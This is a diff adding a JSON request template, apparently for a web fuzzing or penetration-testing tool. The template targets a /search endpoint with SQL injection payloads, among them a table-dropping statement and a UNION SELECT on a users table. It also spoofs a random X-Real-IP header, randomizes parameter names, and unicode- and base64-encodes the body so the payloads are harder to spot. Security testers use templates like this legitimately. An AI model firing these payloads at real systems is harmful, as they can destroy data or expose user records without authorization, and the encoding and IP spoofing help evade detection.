@@ -1,0 +1,52 @@
+{
+  "method": "POST",
+  "path": "/search",
+  "query": [
+    {
+      "key": "debug",
+      "value": "1"
+    },
+    {
+      "key": {
+        "!join": [
+          "",
+          {"!var": "injection_param"},
+          {"!random": [999]}
+        ]
+      },
+      "value": "test"
+    }
+  ],
+  "headers": {
+    "Content-Type": "application/json",
+    "X-Real-IP": {
+      "!join": [
+        ".",
+        {"!random": [255]},
+        {"!random": [255]},
+        {"!random": [255]},
+        {"!random": [255]}
+      ]
+    }
+  },
+  "body": {
+    "!base64_encode": {
+      "!concat": [
+        "{\"query\":\"",
+        {"!unicode_encode": "'; DROP TABLE users; --"},
+        "\",\"limit\":",
+        {"!random": [100]},
+        "}"
+      ]
+    }
+  },
+  "variables": {
+    "injection_param": "search_",
+    "payload_variants": [
+      "' UNION SELECT * FROM users --",
+      "'; DROP TABLE users; --",
+      "' OR '1'='1",
+      "admin'/*"
+    ]
+  }
+}
